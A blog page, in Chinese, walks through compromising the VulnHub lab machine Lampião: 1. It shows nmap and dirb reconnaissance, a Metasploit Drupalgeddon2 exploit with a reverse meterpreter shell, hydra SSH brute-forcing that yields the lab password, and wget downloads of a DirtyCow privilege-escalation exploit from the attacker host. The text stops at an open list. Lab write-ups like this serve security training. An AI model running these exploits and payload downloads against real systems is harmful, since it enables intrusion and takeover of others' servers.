@@ -1,0 +1,566 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Lampião：1 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Lampião：1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-30 00:00" pubdate>
+        2022年4月30日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Lampião：1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x01-Lampiao-1-vulnhub"><a href="#0x01-Lampiao-1-vulnhub" class="headerlink" title="0x01 Lampião: 1~vulnhub"></a>0x01 Lampião: 1~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.144</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:15 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0018s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00040s latency).<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.72 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>netdiscover 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo netdiscover -i eth0 -r 192.168.135.0/24</span><br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                               <br> <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240<br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.135.1   00:50:56:c0:00:08      1      60  VMware, Inc.<br> 192.168.135.2   00:50:56:eb:65:60      1      60  VMware, Inc.<br> 192.168.135.144 00:0c:29:8f:0b:be      1      60  VMware, Inc.<br> 192.168.135.254 00:50:56:e6:a4:73      1      60  VMware, Inc.<br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.144</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -sV -T5 -A -p- 192.168.135.144     <span class="hljs-comment"># 全端口扫描</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>简单的端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.144</span> <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:35 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0020s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 00:0C:29:8F:0B:BE (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.144</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-30 05:39 EDT<br>Nmap scan report for 192.168.135.144<br>Host is up (0.0043s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)<br>|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)<br>|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)<br>|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)<br>80/tcp   open  http?<br>| fingerprint-strings: <br>|   NULL: <br>|     _____ _ _ <br>|     |_|/ ___ ___ __ _ ___ _ _ <br>|     \x20| __/ (_| __ \x20|_| |_ <br>|     ___/ __| |___/ ___|__,_|___/__, ( ) <br>|     |___/ <br>|     ______ _ _ _ <br>|     ___(_) | | | |<br>|     \x20/ _` | / _ / _` | | | |/ _` | |<br>|_    __,_|__,_|_| |_|<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Lampi\xC3\xA3o<br><br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 50.67 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td></td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td></td>
+</tr>
+<tr>
+<td>1898/tcp</td>
+<td>open</td>
+<td>cymtec-port</td>
+<td>Drupal 7</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>目录爆破无果</p>
+<p><strong>1898端口</strong></p>
+<p>进行目录爆破，得到 robots.txt：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.144:1898</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Apr 30 06:22:29 2022<br>URL_BASE: http://192.168.135.144:1898/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.135.144:1898/ ----<br>==&gt; DIRECTORY: http://192.168.135.144:1898/includes/<br>+ http://192.168.135.144:1898/index.php (CODE:200|SIZE:11469)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/misc/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/modules/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/profiles/<br>+ http://192.168.135.144:1898/robots.txt (CODE:200|SIZE:2189)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/scripts/<br>+ http://192.168.135.144:1898/server-status (CODE:403|SIZE:297)<br>==&gt; DIRECTORY: http://192.168.135.144:1898/sites/<br>==&gt; DIRECTORY: http://192.168.135.144:1898/themes/<br>+ http://192.168.135.144:1898/web.config (CODE:200|SIZE:2200)<br>+ http://192.168.135.144:1898/xmlrpc.php (CODE:200|SIZE:42)<br><br>---- Entering directory: http://192.168.135.144:1898/includes/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode &#x27;-w&#x27; if you want to scan it anyway)<br>    <br>-----------------<br><br>END_TIME: Sat Apr 30 06:22:34 2022<br>DOWNLOADED: 4612 - FOUND: 5<br></code></pre></td></tr></table></figure>
+<p>进入 robots.txt，看到 CHANGELOG.txt，打开得知 CSM 框架及版本号：Drupal 7.54, 2017-02-01</p>
+<p>可以在 MSF 上根据 Drupal 漏洞脚本进行权限获取（低权限）。</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="M1、Drupal漏洞"><a href="#M1、Drupal漏洞" class="headerlink" title="M1、Drupal漏洞"></a>M1、Drupal漏洞</h3><p>打开msf：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br></code></pre></td></tr></table></figure>
+<p>在 msf 中搜一下 payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br><span class="hljs-meta">   #</span><span class="bash">  Name                                           Disclosure Date  Rank       Check  Description</span><br>   -  ----                                           ---------------  ----       -----  -----------<br>   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval<br></code></pre></td></tr></table></figure>
+<p>使用最新的、容易利用的1号payload，直接拿到服务器权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use 1<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.144<br>RHOST =&gt; 192.168.135.144<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RPORT 1898<br>RPORT =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[+] The target is vulnerable.<br>[*] Sending stage (39282 bytes) to 192.168.135.144<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.144:44758) at 2022-04-30 07:36:17 -0400<br><br>meterpreter &gt; uname -a<br>[-] Unknown command: uname<br>meterpreter &gt; id<br>[-] Unknown command: id<br>meterpreter &gt; pwd<br>/var/www/html<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>成功拿到 session 会话，输入 shell 进入 shell 终端，再利用 python 获得一个 TTY 终端。</p>
+<p>启动 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> shell</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></code></pre></td></tr></table></figure>
+<h3 id="M2、SSH爆破"><a href="#M2、SSH爆破" class="headerlink" title="M2、SSH爆破"></a>M2、SSH爆破</h3><p>正常访问1898 端口，发现隐藏目录 <code>http://192.168.31.35:1898/?q=node/2</code> ，里面有两个文件：audio.m4a、qrc.png</p>
+<p>访问 <code>http://192.168.31.35:1898/audio.m4a</code>，获取到 <strong><code>username:tiago</code></strong></p>
+<p>使用 cewl 对 <code>http://192.168.31.35:1898/?q=node/1</code> 站点生成字典：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.31.35:1898/?q=node/1 -w password.txt</span><br></code></pre></td></tr></table></figure>
+<p>使用 hydra 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l tiago -P password.txt 192.168.135.144 ssh</span><br></code></pre></td></tr></table></figure>
+<p>得到 <strong><code>password:Virgulino</code></strong></p>
+<p>进行ssh登录，得到一个低权限用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tiago@192.168.135.144<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、扫描内核漏洞"><a href="#1、扫描内核漏洞" class="headerlink" title="1、扫描内核漏洞"></a>1、扫描内核漏洞</h3><p>通过 python 开启本地 http 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure>
+<p>在刚刚获取的低权限用户中获取扫描脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/les.sh</span><br></code></pre></td></tr></table></figure>
+<p>运行得到内核相关漏洞信息，发现可通过 DirtyCow 进行提权。</p>
+<h3 id="2、内核漏洞提权"><a href="#2、内核漏洞提权" class="headerlink" title="2、内核漏洞提权"></a>2、内核漏洞提权</h3><p>查找 DirtyCow 提权脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit dirty</span><br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                               |  Path<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (1)                                                                       | linux/dos/43199.c<br>Linux Kernel - &#x27;The Huge Dirty Cow&#x27; Overwriting The Huge Zero Page (2)                                                                       | linux/dos/44305.c<br>Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (SUID Method)                           | linux/local/40616.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW /proc/self/mem&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                              | linux/local/40847.cpp<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW PTRACE_POKEDATA&#x27; Race Condition (Write Access Method)                                                 | linux/local/40838.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; &#x27;PTRACE_POKEDATA&#x27; Race Condition Privilege Escalation (/etc/passwd Method)                           | linux/local/40839.c<br>Linux Kernel 2.6.22 &lt; 3.9 - &#x27;Dirty COW&#x27; /proc/self/mem Race Condition (Write Access Method)                                                  | linux/local/40611.c<br>Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_dirty() in KGSL                                                              | android/dos/46941.txt<br>Quick and Dirty Blog (qdblog) 0.4 - &#x27;categories.php&#x27; Local File Inclusion                                                                    | php/webapps/4603.txt<br>Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion                                                                     | php/webapps/3729.txt<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (1)                                                                          | linux/local/46361.py<br>snapd &lt; 2.37 (Ubuntu) - &#x27;dirty_sock&#x27; Local Privilege Escalation (2)                                                                          | linux/local/46362.py<br>--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<p>选择 40847.cpp 脚本并拷贝到当前目录下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp ./</span><br></code></pre></td></tr></table></figure>
+<p>通过 python 开启本地 http 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure>
+<p>在刚刚获取的低权限用户中获取该脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/40847.cpp</span><br></code></pre></td></tr></table></figure>
+<p>进行编译、运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="hljs-meta">$</span><span class="bash"> ./dcow</span><br></code></pre></td></tr></table></figure>
+<ol>
